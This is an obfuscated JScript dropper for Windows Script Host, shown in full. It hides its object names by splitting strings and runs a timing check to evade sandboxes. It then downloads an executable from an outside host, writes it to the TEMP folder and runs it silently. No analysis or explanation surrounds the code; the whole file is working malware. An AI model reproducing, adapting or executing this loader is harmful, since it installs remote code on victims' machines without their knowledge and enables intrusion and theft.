var Y0 = false;
var ZY = "Create"+"Object";
var M = function A() {return WScript[ZY]("WScript"+".Shell");}(), QL = 11;
var Z1 = "MSXML2"+".XMLHTTP";
var T = 2;
var S = T - 2;
function PG(YZ){M["Run"](YZ, S, S);};
function L(){return Z1 + "";};
function BY(C, A1){S = S * 1; return C - A1;};
function Z(){return ZY;};
/*@cc_on
  @if (@_win32 || @_win64)
    Y0 = true;
  @end
@*/
if (Y0)
{
var HS = "";
function Q(){return 22;};
var PP = 0; var D = 0;
function AR()
{
var Y = new this["Date"]();
var NG = Y["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var Y = new this["Date"]();
var F = Y["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var Y = new this["Date"]();
var OD = Y["getUTCMilliseconds"]();
var PP = "Z0";
PP = BY(F, NG);
var D = "EH";
D = BY(OD, F);
HS = "open";
return BY(PP, D);
}
var VR = false;
var N0 = false;
for (var OO = S; OO < Q() * 1; OO++){if (AR() != S){
VR = true; 
D = "31" + 11 * PP + D; 
N0 = true; 
break;
}}
function N() {return ((VR == true) && (VR == N0)) ? 1 : S;};
if (VR && N() && N0){
function CG() {return M["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "7NK5A3z0O1rt.ex" + "e";};
 O0 = L();
 BI = WScript[ZY](O0);
 var O = 1;
do { 
	for (;O;){
	try {
		if (O == 1)
		{
			BI[HS]("GET", "http://new.teamlight.ru/si8svf", false);
			BI["send"]();
			QZ = "Sleep";
			O = 2;
		}
		WScript[QZ](Q() + 120); 
		if (BI["readystate"] < 2 * 2) continue;
		O = S;
		function KN(A0) {var OJ = (1, 2, 3, 4, 5, A0); return OJ;};
		T0 = WScript[Z()]("ADODB.Stream");
		O0 = T0;
		O0[HS]();
		O0["type"] = KN(1);
		O0["write"](BI["ResponseBody"]);
		T0["position"] = KN(S);
		O0["Save" + "ToFile"](CG(), 2);
		T0["cl"+"ose"]();
		MX = CG();
		PG(MX);
	} catch(R){};};
}while (O);
}
}

